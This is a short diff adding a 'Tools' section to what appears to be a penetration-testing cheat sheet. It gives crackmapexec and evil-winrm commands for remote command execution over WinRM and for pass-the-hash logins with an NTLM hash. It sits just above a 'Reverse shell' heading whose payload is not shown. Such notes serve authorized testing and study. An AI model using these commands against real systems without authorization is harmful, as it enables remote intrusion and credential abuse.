@@ -1,3 +1,20 @@
+# Tools
+## crackmapexec
+- command execution over winrm
+```bash
+crackmapexec winrm -u user -p password -x whoami $ip
+```
+
+## evil-winrm
+- open winrm session with password
+```bash
+evil-winrm -i $ip -u user -p password
+```
+- open winrm session with ntlm hash (pass the hash)
+```bash
+evil-winrm -i $ip -u user -H hash
+```
+
 # Reverse shell
 - Powershell
 ```powershell
